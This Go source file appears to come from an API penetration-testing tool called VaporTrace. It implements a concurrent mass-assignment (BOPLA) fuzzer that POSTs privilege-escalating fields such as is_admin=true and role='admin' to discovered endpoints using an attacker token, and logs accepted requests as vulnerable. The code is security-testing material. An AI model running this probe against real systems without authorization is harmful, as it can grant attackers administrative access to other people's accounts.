package logic

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"sync"

	"github.com/JoseMariaMicoli/VaporTrace/pkg/db"
	"github.com/JoseMariaMicoli/VaporTrace/pkg/utils"
)

type BOPLAContext struct {
	TargetURL string
	Method    string
	BaseJSON  string
}

var administrativeKeys = []string{
	"is_admin", "isAdmin", "role", "privileges", "status", "verified",
	"permissions", "group_id", "internal_flags", "account_type",
	"is_staff", "can_delete", "access_level", "is_vip", "debug",
}

func ExecuteMassBOPLA(concurrency int) {
	// FIX: Removed pterm
	utils.TacticalLog("[cyan::b]PHASE 9.8: Industrialized BOPLA Engine Started[-:-:-]")

	GlobalDiscovery.mu.RLock()
	var targets []string
	for path, entry := range GlobalDiscovery.Inventory {
		isTarget := false
		for _, eng := range entry.Engines {
			if eng == "BOPLA" {
				isTarget = true
				break
			}
		}
		if isTarget {
			targets = append(targets, path)
		}
	}
	GlobalDiscovery.mu.RUnlock()

	if len(targets) == 0 {
		utils.TacticalLog("[yellow]No BOPLA-prone mutation endpoints detected.[-]")
		return
	}

	for _, path := range targets {
		ctx := &BOPLAContext{
			TargetURL: CurrentSession.TargetURL + path,
			Method:    "POST",
			BaseJSON:  "{}",
		}
		ctx.RunFuzzer(concurrency)
	}
	utils.TacticalLog("[green::b]BOPLA Engine Execution Completed.[-:-:-]")
}

func (b *BOPLAContext) RunFuzzer(concurrency int) {
	var wg sync.WaitGroup
	keyChan := make(chan string, len(administrativeKeys))

	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for key := range keyChan {
				b.ProbeProperty(key)
			}
		}()
	}

	for _, key := range administrativeKeys {
		keyChan <- key
	}
	close(keyChan)
	wg.Wait()
}

func (b *BOPLAContext) ProbeProperty(key string) {
	payloadMap := make(map[string]interface{})
	_ = json.Unmarshal([]byte(b.BaseJSON), &payloadMap)

	if key == "role" || key == "account_type" {
		payloadMap[key] = "admin"
	} else if key == "group_id" || key == "access_level" {
		payloadMap[key] = 0
	} else {
		payloadMap[key] = true
	}

	payload, _ := json.Marshal(payloadMap)

	req, _ := http.NewRequest(b.Method, b.TargetURL, bytes.NewBuffer(payload))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "VaporTrace/2.1.0 (Phase 9.10 Industrialized)")

	activeToken := CurrentSession.AttackerToken
	if activeToken != "" {
		req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", activeToken))
	}

	resp, err := SafeDo(req, false, "BOPLA-ENGINE")
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusNoContent || resp.StatusCode == http.StatusCreated {
		utils.RecordFinding(db.Finding{
			Phase:   "PHASE IV: INJECTION",
			Command: "bopla", // Zero-Touch Trigger
			Target:  b.TargetURL,
			Details: fmt.Sprintf("BOPLA Property Injection Success: '%s' accepted", key),
			Status:  "VULNERABLE",
		})
	}
}
